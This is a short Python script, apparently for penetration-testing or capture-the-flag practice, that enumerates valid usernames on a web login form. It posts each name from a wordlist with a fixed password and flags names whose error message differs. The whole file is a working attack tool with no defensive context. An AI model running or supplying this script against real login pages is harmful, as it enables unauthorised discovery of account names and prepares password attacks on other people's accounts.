import requests

# Define the target URL
url = input("Enter the login URL you want to brute force: ")

# Define the file path containing usernames, use Seclists
file_path = input("Enter the full path to wordlist: ")

# Read the file and process each line
try:
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip()
            if not username:
                continue  # Skip empty lines
            
            # Prepare the POST data
            data = {
                "username": username,
                "password": "password"  # Fixed password for testing, change it depending on your situation
            }

            # Send the POST request
            response = requests.post(url, data=data)
            
            # Check the response content
            if "Wrong password" in response.text:
                print(f"Username found: {username}")
            elif "wrong username" in response.text:
                continue  # Silent continuation for wrong usernames
except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"Error: An HTTP request error occurred: {e}")
